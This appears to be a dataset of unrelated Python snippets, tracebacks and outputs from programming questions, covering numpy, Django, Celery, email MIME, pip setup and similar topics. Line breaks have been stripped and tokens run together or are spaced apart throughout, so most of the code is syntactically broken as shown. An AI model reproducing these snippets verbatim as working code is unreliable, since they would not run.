.. figure : : figures/figure1.png .. include : : relative/path/to/lower.rst . `` image file not readable '' error .
Django==1.11.5 Python 3.6.1
"vals = array ( [ 0.00441025 , 0.0049001 , 0.01041189 , 0.47368389 , 0.34841961 , 0.3487533 , 0.35067096 , 0.31142986 , 0.3268407 , 0.38099566 , 0.3933048 , 0.3479948 , 0.02359819 , 0.36329588 , 0.42535543 , 0.01308297 , 0.53873956 , 0.6511364 , 0.61865282 , 0.64750302 , 0.6630047 , 0.66744816 , 0.71759617 , 0.05965622 , 0.71335208 , 0.71992683 , 0.61635697 , 0.12985441 , 0.73410642 , 0.77318621 , 0.75675988 , 0.03003641 , 0.77527201 , 0.78673995 , 0.05049178 , 0.55139476 , 0.02665514 , 0.61664748 , 0.81121749 , 0.05521697 , 0.63404375 , 0.32649395 , 0.36828268 , 0.68981099 , 0.02874863 , 0.61574739 ] ) x_values = np.linspace ( 0 , 1 , len ( vals ) ) poly_degree = 3coeffs = np.polyfit ( x_values , vals , poly_degree ) poly_eqn = np.poly1d ( coeffs ) y_hat = poly_eqn ( x_values )"
"while ! terminated : image = readImage ( ... ) widget.updateImage ( image , width , height )"
"from timeit import Timerimport arrayt = 10000l = range ( t ) a = array.array ( ' i ' , l ) def LIST ( ) : for i in xrange ( t ) : l [ i ] def ARRAY ( ) : for i in xrange ( t ) : a [ i ] print Timer ( LIST ) .timeit ( 1000 ) ; print Timer ( ARRAY ) .timeit ( 1000 ) ; 0.8131918907171.16269612312"
Name : John Doe1address : somewherephone : 123-123-1234Name : John Doe2address : somewherephone : 123-123-1233Name : John Doe3address : somewherephone : 123-123-1232 Name : John Doe1 address : somewhere phone : 123-123-1234Name : John Doe2 address : somewhere phone : 123-123-1233Name : John Doe3 address : somewhere phone : 123-123-1232
"< 0 > rands before submission : [ 17 , 72 , 97 , 8 , 32 , 15 , 63 , 97 , 57 , 60 ] < 1 > rands before submission : [ 97 , 15 , 97 , 32 , 60 , 17 , 57 , 72 , 8 , 63 ] < 2 > rands before submission : [ 15 , 57 , 63 , 17 , 97 , 97 , 8 , 32 , 60 , 72 ] < 3 > rands before submission : [ 32 , 97 , 63 , 72 , 17 , 57 , 97 , 8 , 15 , 60 ] in function 0 [ 97 , 15 , 97 , 32 , 60 , 17 , 57 , 72 , 8 , 63 ] in function 1 [ 97 , 32 , 17 , 15 , 57 , 97 , 63 , 72 , 60 , 8 ] in function 2 [ 97 , 32 , 17 , 15 , 57 , 97 , 63 , 72 , 60 , 8 ] in function 3 [ 97 , 32 , 17 , 15 , 57 , 97 , 63 , 72 , 60 , 8 ] from __future__ import print_functionimport timeimport randomtry : from concurrent import futuresexcept ImportError : import futuresdef work_with_rands ( i , rands ) : print ( 'in function ' , i , rands ) def main ( ) : random.seed ( 1 ) rands = [ random.randrange ( 100 ) for _ in range ( 10 ) ] # sequence 1 and sequence 2 should give the same results but they do n't # only difference is that one uses a copy of rands ( i.e. , rands.copy ( ) ) # sequence 1 with futures.ProcessPoolExecutor ( ) as ex : for i in range ( 4 ) : print ( `` < { } > rands before submission : { } '' .format ( i , rands ) ) ex.submit ( work_with_rands , i , rands ) random.shuffle ( rands ) print ( '- ' * 30 ) random.seed ( 1 ) rands = [ random.randrange ( 100 ) for _ in range ( 10 ) ] # sequence 2 print ( `` initial sequence : `` , rands ) with futures.ProcessPoolExecutor ( ) as ex : for i in range ( 4 ) : print ( `` < { } > rands before submission : { } '' .format ( i , rands ) ) ex.submit ( work_with_rands , i , rands [ : ] ) random.shuffle ( rands ) if __name__ == `` __main__ '' : main ( )"
"start_time = '22:35'current_time = '23:48'stop_time = '00:00'if current_time == start_time : print `` the program has started '' elif start_time ! = current_time < stop_time : print `` program is half way '' elif current_time > stop_time : print `` program has finished '' start_date = str ( stop_date [ 0 ] ) # get start_date date format from databasestop_date = str ( stop_date [ 1 ] ) # get start_date date format from databaseget_current_time = datetime.datetime.now ( ) .strftime ( ' % H : % M ' ) get_start_time = time.strptime ( start_date , ' % Y % m % d % H % M % S ' ) start_time = time.strftime ( ' % H : % M ' , get_start_time ) get_stop_time = time.strptime ( stop_date , ' % Y % m % d % H % M % S ' ) stop_time = time.strftime ( ' % H : % M ' , get_stop_time ) current_time = str ( get_current_time )"
"import numpy as npvertices = np.array ( [ [ [ 2.0 , 1.0 , 3.0 ] , [ 3.0 , 1.0 , 2.0 ] , [ 1.2 , 2.5 , -2.0 ] ] , [ [ 3.0 , 1.0 , 2.0 ] , [ 1.0 , 2.0 , 3.0 ] , [ 1.2 , -2.5 , -2.0 ] ] , [ [ 1.0 , 2.0 , 3.0 ] , [ 2.0 , 1.0 , 3.0 ] , [ 3.0 , 1.0 , 2.0 ] ] , [ [ 1.0 , 2.0 , 3.0 ] , [ 2.0 , 1.0 , 3.0 ] , [ 2.2 , 2.0 , 1.0 ] ] , [ [ 1.0 , 2.0 , 3.0 ] , [ 2.2 , 2.0 , 1.0 ] , [ 4.0 , 1.0 , 0.0 ] ] , [ [ 2.0 , 1.0 , 3.0 ] , [ 2.2 , 2.0 , 1.0 ] , [ -4.0 , 1.0 , 0.0 ] ] ] ) neighbour = [ [ ] , [ ] , [ 0 , 1 , 3 ] , [ 4 , 5 ] , [ ] , [ ] ] . vertices1 = [ [ [ 2 , 1 , 3 ] , [ 3 , 1 , 2 ] , [ 1 , 2 , -2 ] ] , [ [ 3 , 1 , 2 ] , [ 1 , 2 , 3 ] , [ 1 , -2 , 2 ] ] , [ [ 1 , 2 , 3 ] , [ 2 , 1 , 3 ] , [ 3 , 1 , 2 ] ] , [ [ 1 , 2 , 3 ] , [ 2 , 1 , 3 ] , [ 2 , 2 , 1 ] ] , [ [ 1 , 2 , 3 ] , [ 2 , 2 , 1 ] , [ 4 , 1 , 0 ] ] , [ [ 2 , 1 , 3 ] , [ 2 , 2 , 1 ] , [ -4 , 1 , 0 ] ] , [ [ 3 , 1 , 3 ] , [ 2 , 2 , 1 ] , [ -4 , 1 , 0 ] ] , [ [ 8 , 1 , 2 ] , [ 1 , 2 , 3 ] , [ 1 , -2 , 2 ] ] ] [ 0 , 1 , 3 , 7 , 4 , 5 , 6 ] vertices2 = [ [ [ 2 , 1 , 3 ] , [ 3 , 1 , 2 ] , [ 1 , 2 , -2 ] ] , [ [ 3 , 1 , 2 ] , [ 1 , 2 , 3 ] , [ 1 , -2 , 2 ] ] , [ [ 1 , 2 , 3 ] , [ 2 , 1 , 3 ] , [ 3 , 1 , 2 ] ] , [ [ 1 , 2 , 3 ] , [ 2 , 1 , 3 ] , [ 2 , 2 , 1 ] ] , [ [ 1 , 2 , 3 ] , [ 2 , 2 , 1 ] , [ 4 , 1 , 0 ] ] , [ [ 8 , 1 , 2 ] , [ 1 , 2 , 3 ] , [ 1 , -2 , 2 ] ] , [ [ 2 , 1 , 3 ] , [ 2 , 2 , 1 ] , [ -4 , 1 , 0 ] ] , [ [ 3 , 1 , 3 ] , [ 2 , 2 , 1 ] , [ -4 , 1 , 0 ] ] ] [ 0 , 1 , 3 , 4 , 5 , 6 , 7 ] . [ 0 , 1 , 3 , 7 , 4 , 5 , 6 ] [ 0 , 1 , 3 , 5 , 4 , 6 , 7 ] ."
# ! /usr/bin/python2.7 def fib ( n ) : if n == 0 : return 0 elif n == 1 : return 1 else : return fib ( n-1 ) +fib ( n-2 ) i = 0while i < 35 : print fib ( i ) i = i + 1 # ! /usr/bin/rubydef fib ( n ) if n == 0 return 0 elsif n == 1 return 1 else fib ( n-1 ) +fib ( n-2 ) endend i = 0 while ( i < 35 ) puts fib ( i ) i = i + 1 end real 0m4.782s user 0m4.763s sys 0m0.010s real 0m11.605suser 0m11.563ssys 0m0.013s
"class TestMyMixin ( APITestCase ) : class DummyView ( MyMixin , viewsets.ModelViewSet ) : queryset = MyModel.objects.all ( ) serializer_class = MyModelSerializer # some properties omitted def setUp ( self ) : self.view = self.DummyView.as_view ( \ actions= { 'get ' : 'list ' } ) def test_basic_query ( self ) : instance = MyModel.objects.create ( \ ** { 'name ' : 'alex ' } ) request = APIRequestFactory ( ) .get ( \ '/fake-path ? query=ale ' , content_type='application/json ' ) response = self.view ( request ) self.assertEqual ( \ response.status_code , status.HTTP_200_OK ) json_dict = json.loads ( \ response.content.decode ( 'utf-8 ' ) ) self.assertEqual ( json_dict [ 'name ' ] , instance.name ) raise ContentNotRenderedError ( 'The response content must be 'django.template.response.ContentNotRenderedError : The response content must be rendered before it can be accessed ."
"class MyModel ( models.Model ) : def GetTwoValues ( self ) : foo = [ ] bar = [ ] # expensive operation return foo , barclass MyModelSerializer ( serializers.HyperlinkedModelSerializer ) : foo = serializers.SerializerMethodField ( ) bar = serializers.SerializerMethodField ( ) def get_foo ( self , obj ) : foo , _ = obj.GetTwoValues ( ) return foo def get_bar ( self , obj ) : _ , bar = obj.GetTwoValues ( ) return bar class Meta : model = MyModel fields = ( 'FirstValue ' , 'SecondValue ' , )"
class A : content = 'video ' or 'image ' or 'music ' data = contentData # where content may be video or image or music depending on content.class videoData : length = * director = * actors = * class imageData : dimensions = *class musicData : genre = *
def myfunc ( filename : str ) - > None : with open ( filename ) as f1 : # do something here
"> > > dummy_task.apply_async ( eta=datetime.datetime.now ( ) + timedelta ( seconds=60 ) ) < AsyncResult : 03001c1c-329e-46a3-8180-b115688e1865 > 2012-07-24T14:03:08+00:00 app [ scheduler.1 ] : [ 2012-07-24 10:03:08,909 : INFO/MainProcess ] Got task from broker : events.tasks.dummy_task [ 910ff406-d51c-4c29-bdd1-fec1a8168c12 ] eta : [ 2012-07-24 10:04:08.819528+00:00 ] > > > dummy_task.delay ( ) < AsyncResult : 1285ff04-bccc-46d9-9801-8bc9746abd1c > 2012-07-24T14:29:26+00:00 app [ worker.1 ] : [ 2012-07-24 10:29:26,513 : INFO/MainProcess ] Got task from broker : events.tasks.dummy_task [ 1285ff04-bccc-46d9-9801-8bc9746abd1c ] ... .2012-07-24T14:29:26+00:00 app [ worker.1 ] : [ 2012-07-24 10:29:26,571 : INFO/MainProcess ] Task events.tasks.dummy_task [ 1285ff04-bccc-46d9-9801-8bc9746abd1c ] succeeded in 0.0261888504028s : None"
raise ValueErrorraise ValueError ( )
"if request.method == 'GET ' : # Get object using swiftclient conn = swiftclient.client.Connection ( **credentials ) container , file = 'container_name ' , 'object_name ' _ , data = conn.get_object ( container , file ) # Send object to the browser return Response ( data , content_type= '' image/png '' )"
"import numpy as npA = np.array ( [ [ 1 , 2 ] , [ 3 , 4 ] ] ) B = np.array ( [ [ 5 , 6 ] , [ 7 , 8 ] ] ) C = np.array ( [ [ 1 , 2 , 0 , 0 ] , [ 3 , 4 , 0 , 0 ] , [ 0 , 0 , 5 , 6 ] , [ 0 , 0 , 7 , 8 ] ] )"
30.51 = > 01:53:4e:9830.46 = > 01:53:8e:9430.43 = > 01:53:8e:9130.39 = > 01:53:8e:8e30.39 = > 01:53:4e:8e12.36 = > 01:52:88 : b116.01 = > 01:52 : c9 : cf18.65 = > 01:52 : ca : a521.14 = > 01:52:8b:74
"import localelocale.setlocale ( locale.LC_ALL , 'es_ES.utf8 ' ) from datetime import datetime as dtdf [ 'date ' ] = dt.strptime ( df [ 'date ' ] , ' % b % d % Y ' ) df [ 'date ' ] = df [ 'date ' ] .strftime ( ' % Y- % m- % d ' ) Error : unsupported locale setting"
"# C. sort_last # Given a list of non-empty tuples , return a list sorted in increasing # order by the last element in each tuple. # e.g . [ ( 1 , 7 ) , ( 1 , 3 ) , ( 3 , 4 , 5 ) , ( 2 , 2 ) ] yields # [ ( 2 , 2 ) , ( 1 , 3 ) , ( 3 , 4 , 5 ) , ( 1 , 7 ) ] # Hint : use a custom key= function to extract the last element form each tuple.def sort_last ( tuples ) : # +++your code here+++ return"
"> > > results [ [ 1 , 2 , 3 , ' a ' , ' b ' ] , [ 1 , 2 , 3 , ' c ' , 'd ' ] , [ 4 , 5 , 6 , ' a ' , ' b ' ] , [ 4 , 5 , 6 , ' c ' , 'd ' ] ] > > > def pr ( line ) : ... print line > > > for result in results : ... pr ( result ) ... [ 1 , 2 , 3 , ' a ' , ' b ' ] [ 1 , 2 , 3 , ' c ' , 'd ' ] [ 4 , 5 , 6 , ' a ' , ' b ' ] [ 4 , 5 , 6 , ' c ' , 'd ' ] > > > map ( pr , results ) [ 1 , 2 , 3 , ' a ' , ' b ' ] [ 1 , 2 , 3 , ' c ' , 'd ' ] [ 4 , 5 , 6 , ' a ' , ' b ' ] [ 4 , 5 , 6 , ' c ' , 'd ' ] [ None , None , None , None ]"
"import base64filename = 'image.jpg ' with open ( filename , `` rb '' ) as image_file : encoded_string = base64.b64encode ( image_file.read ( ) ) image_file.close ( ) with open ( `` encoded_string.txt '' , `` w '' ) as converted_file : converted_file.write ( str ( encoded_string ) ) converted_file.close ( ) from PIL import Imageimport cv2import io # Take in base64 string and return cv imagedef stringToRGB ( base64_string ) : imgdata = base64.b64decode ( str ( base64_string ) ) image = Image.open ( io.BytesIO ( imgdata ) ) return cv2.cvtColor ( np.array ( image ) , cv2.COLOR_BGR2RGB ) stringToRGB ( encoded_string ) -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -OSError Traceback ( most recent call last ) < ipython-input-43-2564770fa4af > in < module > ( ) -- -- > 1 stringToRGB ( encoded_string ) < ipython-input-42-538f457423e9 > in stringToRGB ( base64_string ) 18 def stringToRGB ( base64_string ) : 19 imgdata = base64.b64decode ( str ( base64_string ) ) -- - > 20 image = Image.open ( io.BytesIO ( imgdata ) ) 21 return cv2.cvtColor ( np.array ( image ) , cv2.COLOR_BGR2RGB ) ~\Anaconda3\lib\site-packages\PIL\Image.py in open ( fp , mode ) 2655 warnings.warn ( message ) 2656 raise IOError ( `` can not identify image file % r '' - > 2657 % ( filename if filename else fp ) ) 2658 2659 # OSError : can not identify image file < _io.BytesIO object at 0x00000224D6E7D200 >"
"params = { 'format ' : 'json ' , `` nojsoncallback '' : `` 1 '' , 'api_key ' : 'my_api_key ' , } with open ( 'myfile.jpg ' , 'rb ' ) as f : files = { 'file ' : f } r = the_oauth_requests_session.post ( 'https : //up.flickr.com/services/upload/ ' , params=params , files=files ) print r.content"
"import itertools as itimport numpy as npdata = [ ' a ' , ' b ' , ' c ' , 'd ' ] dw = np.array ( [ 1 , 3 ] , dtype=np.int64 ) print ( list ( it.islice ( data , dw [ 0 ] , dw [ 1 ] ,1 ) ) ) ValueError : Stop argument for islice ( ) must be None or an integer : 0 < = x < = sys.maxsize ."
src __init__.py script1.py script2.pytest test_fun.py def fun2 ( ) : return ( 'result_from_2 ' ) from script2 import fun2def fun1 ( ) : return ( fun2 ( ) +'_plus_something ' ) import syssys.path.append ( '../ ' ) from src.script1 import fun1def test_fun1 ( ) : output1 = fun1 ( ) # check output assert output1=='result_from_2_plus_something '
"a= [ 0,1,6,4,2,8 ] b= [ 10,20,30,40 ] [ 10,20,6,30,40,8 ]"
"from quantecon import approx_markov Traceback ( most recent call last ) : File `` < stdin > '' , line 1 , in < module > File `` /usr/local/lib/python3.4/dist-packages/quantecon/__init__.py '' , line 6 , in < module > from asset_pricing import AssetPricesImportError : No module named 'asset_pricing ' pip3 install quantecon pip install quantecon"
"Mary 0 1 1 1Joe 1 0 1 1Bob 1 1 0 1Susan 1 1 1 0 Mary Joe Bob Susan ( joe , mary , bob ) ( joe , mary , susan ) ( bob , mary , susan ) ( bob , joe , susan ) from numpy import *from scipy import *def buildTriangles ( G ) : # G is a sparse adjacency matrix start = time.time ( ) ctr = 0 G = G + G.T # I do this to make sure it is symmetric triples = [ ] for i in arange ( G.shape [ 0 ] - 1 ) : # for each row but the last one J , J = G [ i , : ] .nonzero ( ) # J : primary friends of user i # I do J , J because I do not care about the row values J = J [ J < i ] # only computer the lower triangle to avoid repetition for j in J : K , buff = G [ : ,j ] .nonzero ( ) # K : secondary friends of user i K = K [ K > i ] # only compute below i to avoid repetition for k in K : ctr = ctr + 1 triples.append ( ( i , j , k ) ) print ( `` total number of triples : % d '' % ctr ) print ( `` run time is % .2f '' % ( time.time ( ) - start ( ) ) return triples"
"axes.grid ( False , which='minor ' )"
"cls @ clsmba > python3Python 3.6.5 ( default , Mar 30 2018 , 06:42:10 ) [ GCC 4.2.1 Compatible Apple LLVM 9.0.0 ( clang-900.0.39.2 ) ] on darwinType `` help '' , `` copyright '' , `` credits '' or `` license '' for more information. > > > cls @ clsmba ~ > pip -- versionpip 9.0.3 from /usr/local/lib/python2.7/site-packages ( python 2.7 ) cls @ clsmba ~ > pip2 -- versionpip 9.0.3 from /usr/local/lib/python2.7/site-packages ( python 2.7 ) cls @ clsmba ~ > pip3.5Failed to execute process '/usr/local/bin/pip3.5 ' . Reason : The file '/usr/local/bin/pip3.5 ' specified the interpreter '/usr/local/opt/python3/bin/python3.5 ' , which is not an executable command . cls @ clsmba ~ > python3 get-pip.pyRequirement already up-to-date : pip in /usr/local/lib/python3.6/site-packages cls @ clsmba > brew reinstall python== > Reinstalling python == > Installing dependencies for python : sqlite== > Installing python dependency : sqlite== > Downloading https : //homebrew.bintray.com/bottles/sqlite-3.23.1.sierra.bottle.tar.gz== > Downloading from https : //akamai.bintray.com/75/75bf05c73a9b51101ea166742eb9baf285eda857fd98ea1d50a3abf0d81bd978 ? __gda__=exp=1523530592~hmac=ae4fc4056ff461c4fc3ca75983cd0f22c231e084312090e6c484aa59b02d3c1f & response-content-disposition=attachment % 3Bfilename % 3D % 22sqlite-3.23.1.sierra.bottle.tar.gz % 22 & response-content-type=application % 2Fgzip & requestInfo=U2FsdGVkX1-3IGgcJJtJX59zX8HP5dbhO9NFlYr07n9KOgP7AOcaoTM4pAOrLWqfH9MzbvCoUoNWKvWGRelKsrku6Kulv8WBBKAT7jGnTKBaYlEQpp1oEnHgh5nU-WVdBxk # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # 100.0 % == > Pouring sqlite-3.23.1.sierra.bottle.tar.gz== > CaveatsThis formula is keg-only , which means it was not symlinked into /usr/local , because macOS provides an older sqlite3.If you need to have this software first in your PATH run : echo 'export PATH= '' /usr/local/opt/sqlite/bin : $ PATH '' ' > > ~/.bash_profileFor compilers to find this software you may need to set : LDFLAGS : -L/usr/local/opt/sqlite/lib CPPFLAGS : -I/usr/local/opt/sqlite/includeFor pkg-config to find this software you may need to set : PKG_CONFIG_PATH : /usr/local/opt/sqlite/lib/pkgconfig== > Summary /usr/local/Cellar/sqlite/3.23.1 : 11 files , 3MB== > Installing python== > Downloading https : //homebrew.bintray.com/bottles/python-3.6.5.sierra.bottle.tar.gzAlready downloaded : /Users/cls/Library/Caches/Homebrew/python-3.6.5.sierra.bottle.tar.gz== > Pouring python-3.6.5.sierra.bottle.tar.gz== > /usr/local/Cellar/python/3.6.5/bin/python3 -s setup.py -- no-user-cfg install -- force -- verbose -- install-scripts=/usr/local/Cellar/python/3.6.5/bin -- install-lib=/usr/local/lib/python3.6/site-packages -- single-version-externally-managed -- record=installed.txtLast 15 lines from /Users/cls/Library/Logs/Homebrew/python/post_install.01.python3 : copying setuptools/script ( dev ) .tmpl - > build/lib/setuptoolscopying setuptools/script.tmpl - > build/lib/setuptoolscopying setuptools/cli-32.exe - > build/lib/setuptoolscopying setuptools/cli-64.exe - > build/lib/setuptoolscopying setuptools/cli.exe - > build/lib/setuptoolscopying setuptools/gui-32.exe - > build/lib/setuptoolscopying setuptools/gui-64.exe - > build/lib/setuptoolscopying setuptools/gui.exe - > build/lib/setuptoolscopying setuptools/command/launcher manifest.xml - > build/lib/setuptools/commandrunning install_libcopying build/lib/easy_install.py - > /usr/local/lib/python3.6/site-packagescopying build/lib/pkg_resources/__init__.py - > /usr/local/lib/python3.6/site-packages/pkg_resources/usr/local/Cellar/python/3.6.5/Frameworks/Python.framework/Versions/3.6/lib/python3.6/distutils/dist.py:261 : UserWarning : Unknown distribution option : 'long_description_content_type ' warnings.warn ( msg ) error : could not delete '/usr/local/lib/python3.6/site-packages/pkg_resources/__init__.py ' : Permission deniedWarning : The post-install step did not complete successfullyYou can try again using ` brew postinstall python ` == > CaveatsPython has been installed as /usr/local/bin/python3Unversioned symlinks ` python ` , ` python-config ` , ` pip ` etc . pointing to ` python3 ` , ` python3-config ` , ` pip3 ` etc. , respectively , have been installed into /usr/local/opt/python/libexec/binIf you need Homebrew 's Python 2.7 run brew install python @ 2Pip , setuptools , and wheel have been installed . To update them run pip3 install -- upgrade pip setuptools wheelYou can install Python packages with pip3 install < package > They will install into the site-package directory /usr/local/lib/python3.6/site-packagesSee : https : //docs.brew.sh/Homebrew-and-Python== > Summary bash-3.2 $ echo $ PATH /usr/local/opt/python/bin : /usr/local/sbin : /usr/local/Cellar/ruby/1.9.3-p194/bin : /usr/local/share/python3 : /usr/local/bin : /usr/bin : /bin : /usr/sbin : /sbin : /usr/local/bin : /opt/X11/bin : /Applications/Server.app/Contents/ServerRoot/usr/bin : /Applications/Server.app/Contents/ServerRoot/usr/sbin : /Library/Frameworks/Mono.framework/Versions/Current/Commands : /Library/TeX/texbin bash-3.2 $ python Python 2.7.10 ( default , Feb 7 2017 , 00:08:15 ) [ GCC 4.2.1 Compatible Apple LLVM 8.0.0 ( clang-800.0.34 ) ] on darwin Type `` help '' , `` copyright '' , `` credits '' or `` license '' for more information . > > > ^D bash-3.2 $ python3Python 3.6.5 ( default , Mar 30 2018 , 06:42:10 ) [ GCC 4.2.1 Compatible Apple LLVM 9.0.0 ( clang-900.0.39.2 ) ] on darwinType `` help '' , `` copyright '' , `` credits '' or `` license '' for more information. > > > bash-3.2 $ pip3bash : pip3 : command not foundbash-3.2 $ pip -- versionpip 9.0.3 from /usr/local/lib/python2.7/site-packages ( python 2.7 )"
"import subprocessp = subprocess.Popen ( 'abaqus python getData.py ' , shell=True ) p_status = p.wait ( ) print b from numpy import *if __name__ == `` __main__ '' : b = [ 0,1,2,3 ] # output is a list of integers global a = b"
"multipart/mixed multipart/alternative text/plain multipart/related text/html image/png - inline application/pdf - attachment message = MIMEMultipart ( `` mixed '' ) message [ `` From '' ] = ... ... bodyText = `` ... '' bodyHTML = `` ... '' mailFrom = `` ... '' targetEmail = `` ... '' imageContent = ... messageBody = MIMEMultipart ( `` alternative '' ) messageBody.attach ( MIMEText ( bodyText , `` plain '' ) ) messageBodyHTML = MIMEMultipart ( `` related '' ) messageBodyHTML.attach ( MIMEText ( bodyHTML , `` html '' ) ) messageImage = MIMEImage ( imageContent ) messageImage.add_header ( `` Content-Disposition '' , 'inline ; filename= '' ... '' ' ) messageImage.add_header ( `` Content-ID '' , `` < id used in html body > '' ) messageBodyHTML.attach ( messageImage ) messageBody.attach ( messageBodyHTML ) message.attach ( messageBody ) attachment = MIMEApplication ( fileContent , Name=fileName ) attachment.add_header ( `` Content-Disposition '' , 'attachment ; filename= '' ... '' ' ) message.attach ( attachment ) self.smtplibSession.sendmail ( mailSource , targetEmail , message.as_string ( ) ) MIME-Version : 1.0Date : Thu , 30 May 2019 17:45:28 +0200From : xxxxx < xxxxx > Subject : xxxxxThread-Topic : xxxxxTo : `` xxxxx '' < xxxxx > Content-Type : multipart/related ; boundary= '' _5D6C043C-FD42-42F9-B0E0-841DBFBA96D5_ '' -- _5D6C043C-FD42-42F9-B0E0-841DBFBA96D5_Content-Transfer-Encoding : quoted-printableContent-Type : text/html ; charset= '' utf-8 '' < center > < img src=3D '' cid : embedded-image '' alt= ... -- _5D6C043C-FD42-42F9-B0E0-841DBFBA96D5_Content-Type : image/png ; name= '' embedded-image.png '' Content-ID : < embedded-image > Content-Transfer-Encoding : base64Content-Disposition : inline ; filename= '' embedded-image.png '' iVBORw0KGgoAAAAN ... -- _5D6C043C-FD42-42F9-B0E0-841DBFBA96D5_ --"
id su_id r_value match_vA A1 0 1A A2 0 1A A3 70 2A A4 120 100A A5 250 3A A6 250 100B B1 0 1B B2 30 2 id su_id r_value match_vA A1 0 1A A2 0 1A A3 70 2A A4 120 2A A5 250 3A A6 250 3B B1 0 1B B2 30 2
"ErrorTraceback ( most recent call last ) : File `` /usr/local/Cellar/python3/3.6.4_2/Frameworks/Python.framework/Versions/3.6/lib/python3.6/unittest/case.py '' , line 59 , in testPartExecutor yield File `` /usr/local/Cellar/python3/3.6.4_2/Frameworks/Python.framework/Versions/3.6/lib/python3.6/unittest/case.py '' , line 605 , in run testMethod ( ) File `` /usr/local/Cellar/python3/3.6.4_2/Frameworks/Python.framework/Versions/3.6/lib/python3.6/unittest/loader.py '' , line 34 , in testFailure raise self._exceptionImportError : Failed to import test module : testsTraceback ( most recent call last ) : File `` /usr/local/Cellar/python3/3.6.4_2/Frameworks/Python.framework/Versions/3.6/lib/python3.6/unittest/loader.py '' , line 462 , in _find_test_path package = self._get_module_from_name ( name ) File `` /usr/local/Cellar/python3/3.6.4_2/Frameworks/Python.framework/Versions/3.6/lib/python3.6/unittest/loader.py '' , line 369 , in _get_module_from_name __import__ ( name ) File `` /Users/paymahn/solvvy/scheduler/tests/__init__.py '' , line 2 , in import tests.test_setup_script File `` /Users/paymahn/solvvy/scheduler/tests/test_setup_script.py '' , line 3 , in import setup File `` /Applications/PyCharm.app/Contents/helpers/pydev/setup.py '' , line 87 , in data_files.append ( ( 'pydevd_attach_to_process ' , [ os.path.join ( 'pydevd_attach_to_process ' , f ) for f in os.listdir ( 'pydevd_attach_to_process ' ) if accept_file ( f ) ] ) ) FileNotFoundError : [ Errno 2 ] No such file or directory : 'pydevd_attach_to_process ' import unittestimport osimport setup # the path to this file is scheduler/setup.py . This import may be breaking thingsclass TestSetupScript ( unittest.TestCase ) : def test_load_db_connection_valid_yaml_file ( self ) : file_name = `` valid-yaml.yml '' with open ( file_name , ' w ' ) as file : file.write ( `` '' '' test : hello world a = b `` '' '' ) yaml = setup.load_yaml_configuration ( file_name ) # I want to debug the line above , hence no assertions here"
"> > > a = [ ' 1 ' , ' 2 ' , ' 3 ' , ' 4 ' ] > > > b = a [ : a.index ( ' 2 ' ) +1 ] + [ ' 2.4 ' , ' 2.6 ' ] + a [ a.index ( ' 2 ' ) : ] > > > b < < < [ ' 1 ' , ' 2 ' , ' 2.4 ' , ' 2.6 ' , ' 3 ' , ' 4 ' ]"
"class Task ( object ) : result = None def inputs ( self ) : `` ' List all requirements of the task. `` ' return ( ) def run ( self ) : pass import threadingclass Runner ( threading.Thread ) : def __init__ ( self , task ) : super ( Runner , self ) .__init__ ( ) self.task = task self.start ( ) def run ( self ) : threads = [ Runner ( r ) for r in self.task.inputs ( ) ] [ t.join ( ) for t in threads ] self.task.run ( )"
"def process_things ( callback , things ) : with start_transaction ( ) : for thing in things : obj = Thing.objects.create ( … ) callback ( obj ) def callback ( obj ) : with start_separate_transaction ( ) : … ThingProcessingLog.objects.create ( … )"
< form method= '' POST '' name= '' wifi '' id= '' wifi '' action= '' http : //192.168.100.1:5280/ '' > < input type= '' image '' name= '' mode_login '' value= '' Agree '' src= '' btn_accept.gif '' / > < input type= '' hidden '' name= '' redirect '' value= '' http : //stackoverflow.com/ '' > < /form >
"print ( 'Hello % ( name ) s , you have % ( messages ) i messages ' % locals ( ) )"
"from google.appengine.ext import db from myapp.main.models import Story , Comment import bulkupdate class Migrate ( bulkupdate.BulkUpdater ) : DELETE_COMPLETED_JOBS_DELAY = 0 DELETE_FAILED_JOBS = False PUT_BATCH_SIZE = 1 DELETE_BATCH_SIZE = 1 MAX_EXECUTION_TIME = 10 def get_query ( self ) : return Story.all ( ) .filter ( `` hidden '' , False ) .filter ( `` visible '' , True ) def handle_entity ( self , entity ) : comments = entity.comment_set for comment in comments : s = Story ( ) s.parent_story = comment.story s.user = comment.user s.text = comment.text s.submitted = comment.submitted self.put ( s ) job = Migrate ( ) job.start ( ) Permanent failure attempting to execute taskTraceback ( most recent call last ) : File `` /base/python_runtime/python_lib/versions/1/google/appengine/ext/deferred/deferred.py '' , line 258 , in post run ( self.request.body ) File `` /base/python_runtime/python_lib/versions/1/google/appengine/ext/deferred/deferred.py '' , line 122 , in run raise PermanentTaskFailure ( e ) PermanentTaskFailure : 'module ' object has no attribute 'Migrate '"
"graphs = [ ] # A list of networkx graphsunique = [ ] # A list of unique graphsfor new in graphs : for old in unique : if nx.is_isomorphic ( new , old [ 0 ] ) : break else : unique.append ( [ new ] )"
"import matplotlib.pyplot as plt % matplotlib inlinefig1 = plt.figure ( 1 ) plt.plot ( [ 1,2,3 ] , [ 5,2,4 ] ) plt.show ( ) plt.figure ( 1 ) # attempting to reference the figure I created earlier ... # four things I 've tried : plt.show ( ) # does nothing ... : ( fig1.show ( ) # throws warning about backend and does nothingfig1.draw ( ) # throws error about rendererfig1.plot ( [ 1,2,3 ] , [ 5,2,4 ] ) # This also does n't work ( jupyter outputs some # text saying matplotlib.figure.Figure at 0x ... , changing the backend and # using plot do n't help with that either ) , but regardless in reality # these plots have a lot going on and I 'd like to recreate them # without running all of the same commands over again ."
T = mahotas.thresholding.otsu ( dna )
"> > > import sys > > > print sys.stdin.__path__'/dev/tty1 ' > > > import os , sysos.readlink ( '/proc/self/fd/ % s ' % sys.stdin.fileno ( ) )"
"import requests import json import logging import datetime import base64 import urllib serverURL = 'https : //jira-stability-tools.company.com/jira ' user = 'username ' password = 'password ' query = 'project = PROJECTNAME AND `` Build Info '' ~ BUILDNAME AND assignee=ASSIGNEENAME ' jql = '/rest/api/2/search ? jql= % s ' % urllib.quote ( query ) response = requests.get ( serverURL + jql , verify=False , auth= ( user , password ) ) print response.json ( )"
"def someMethod ( self ) : try : # ... except someException : # in case of exception , do something here # e.g display a dialog box to inform the user # that he has done something wrong"
